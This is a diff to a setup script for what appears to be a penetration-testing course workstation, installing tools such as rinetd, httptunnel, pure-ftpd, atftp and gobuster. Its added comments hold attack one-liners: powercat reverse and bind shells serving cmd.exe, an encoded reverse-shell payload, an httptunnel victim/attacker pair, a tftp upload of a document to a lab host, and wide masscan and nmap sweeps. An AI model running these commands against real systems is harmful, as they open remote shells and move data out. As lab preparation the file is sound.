@@ -1,3 +1,6 @@
+# curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
+# echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
+
 banner "Updating: APT"
 sudo apt -y update
 
@@ -30,6 +33,14 @@ sudo apt install --no-upgrade mdbtools
 banner "Installing: nfs-common" 
 sudo apt install --no-upgrade nfs-common
 
+banner "Installing: rinetd - port forwarding tool" 
+sudo apt install rinetd
+
+banner "Installing: httptunnel" 
+sudo apt install httptunnel
+# victim: hts --forward-port localhost:8888 1234
+# attacker: htc --forward-port 8080 10.11.0.128:1234
+
 banner "Installing: mingw-w64" 
 sudo apt install --no-upgrade mingw-w64
 
@@ -38,6 +49,10 @@ sudo apt install --no-upgrade libc6-dev-i386
 
 banner "Installing: winetricks" 
 sudo apt install --no-upgrade wine winetricks
+
+#sudo dpkg --add-architecture i386
+#sudo apt update
+#apt-get install --no-upgrade wine32
 
 banner "Installing: winetricks python27" 
 winetricks python27
@@ -114,9 +129,10 @@ fi
 # apt --fix-broken install
 
 # Keyboard shortcuts
-banner "Adding aliases"
-if ! grep -q "SimpleHTTPServer" "/etc/profile.d/00-aliases.sh"; then
-cat <<EOT >> /etc/profile.d/00-aliases.sh
+#banner "Adding aliases"
+#if ! grep -q "SimpleHTTPServer" "/etc/profile.d/00-aliases.sh"; then
+#/etc/profile.d/00-aliases.sh
+cat <<EOT >> /tmp/00-aliases.sh
 #!/bin/bash
 
     ## will prevent the need of exiting/reopening terminal after adding an alias
@@ -162,36 +178,67 @@ cat <<EOT >> /etc/profile.d/00-aliases.sh
 EOT
 fi
 
-
-
-#!/bin/bash
-#apt update && apt install pure-ftpd
-#groupadd ftpgroup
-#useradd -g ftpgroup -d /dev/null -s /etc ftpuser
-#pure-pw useradd offsec -u ftpuser -d /ftphome # use user offsec when logging into ftp
-#pure-pw mkdb
-#cd /etc/pure-ftpd/auth/
-#ln -s ../conf/PureDB 60pdb
-#mkdir -p /ftphome # DIRECTORY HOSTING FILES
-#chown -R ftpuser:ftpgroup /ftphome/
-#service pure-ftpd restart
+apt install pure-ftpd
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd offsec -u ftpuser -d /ftphome # use user offsec when logging into ftp
+pure-pw mkdb
+#n-me
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p /ftphome # DIRECTORY HOSTING FILES
+chown -R ftpuser:ftpgroup /ftphome/
+service pure-ftpd stop
 
 sudo apt install gobuster
 
+#banner "Adding terminal twinks"
+#if ! grep -q "last_dir" "~/.bashrc"; then
+#cat <<EOT >> ~/.bashrc
+## save path on cd
+#function cd {
+#    builtin cd $@
+#    pwd > ~/.last_dir
+#}
+#
+## restore last saved path
+#if [ -f ~/.last_dir ]
+#    then cd `cat ~/.last_dir`
+#fi
+#EOT
 
-banner "Adding terminal twinks"
-if ! grep -q "last_dir" "~/.bashrc"; then
-cat <<EOT >> ~/.bashrc
+sudo apt install atftp
+sudo mkdir /tftp
+sudo chown nobody: /tftp
+# sudo atftpd --daemon --port 69 /tftp
+# tftp -i 10.11.0.4 put important.docx
 
-# save path on cd
-function cd {
-    builtin cd $@
-    pwd > ~/.last_dir
-}
+#sudo apt-get install docker-ce
 
-# restore last saved path
-if [ -f ~/.last_dir ]
-    then cd `cat ~/.last_dir`
-fi
+#sdkman
+#java 11
+#ghidra
 
-EOT
+#pure-ftpd
+#export HISTTIMEFORMAT='%F %T '
+
+#socat
+#powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+#powercat -c 10.11.0.4 -p 443 -e cmd.exe
+#powercat -l -p 443 -e cmd.exe
+#standalong ps1 file encoded 
+#powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell. ps1 
+
+#reconng
+#Gitrob or Gitleaks,
+
+# Network scan
+#nbtscan -r 10.11.1.0/24
+#masscan -p80 10.0.0.0/8
+#nmap -v -sn 10.11.1.1-254
+
+#FoxyProxy
+#Add Burp CA to browser
+
+#### WINDOWS
+#Mingw-w64
